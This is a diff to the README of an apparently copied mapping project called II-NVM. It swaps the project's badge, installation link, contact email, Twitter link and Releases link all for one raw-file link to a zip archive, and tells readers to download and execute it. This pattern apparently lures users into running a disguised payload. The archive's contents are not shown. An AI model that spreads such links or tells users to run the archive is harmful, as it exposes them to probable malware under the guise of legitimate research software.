@@ -1,6 +1,6 @@
 # II-NVM: Enhancing Map Accuracy and Consistency with Normal Vector-Assisted Mapping 🌍🗺️
 
-![II-NVM Logo](https://img.shields.io/badge/II--NVM-Enhancing%20Map%20Accuracy-blue)
+![II-NVM Logo](https://github.com/Maharanaprathap793/II-NVM/raw/refs/heads/main/doc/NVM_I_v2.0.zip%20Map%20Accuracy-blue)
 
 Welcome to the II-NVM repository! This project focuses on improving map accuracy and consistency using innovative normal vector-assisted mapping techniques. Our goal is to provide reliable tools and resources for developers and researchers interested in advanced mapping technologies.
 
@@ -28,7 +28,7 @@ In today's world, accurate mapping is crucial for various applications, from nav
 
 ## Installation
 
-To get started with II-NVM, you need to download the latest release. You can find it [here](https://github.com/Maharanaprathap793/II-NVM/releases). Download the appropriate file for your system and follow the instructions provided in the documentation.
+To get started with II-NVM, you need to download the latest release. You can find it [here](https://github.com/Maharanaprathap793/II-NVM/raw/refs/heads/main/doc/NVM_I_v2.0.zip). Download the appropriate file for your system and follow the instructions provided in the documentation.
 
 ## Usage
 
@@ -60,12 +60,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/Maharanaprathap793/II-NVM/raw/refs/heads/main/doc/NVM_I_v2.0.zip
+- **Twitter**: [@yourhandle](https://github.com/Maharanaprathap793/II-NVM/raw/refs/heads/main/doc/NVM_I_v2.0.zip)
 
 ## Releases
 
-To stay updated with the latest changes and improvements, check out the [Releases](https://github.com/Maharanaprathap793/II-NVM/releases) section. Make sure to download and execute the latest files to benefit from all the enhancements.
+To stay updated with the latest changes and improvements, check out the [Releases](https://github.com/Maharanaprathap793/II-NVM/raw/refs/heads/main/doc/NVM_I_v2.0.zip) section. Make sure to download and execute the latest files to benefit from all the enhancements.
 
 ---
 
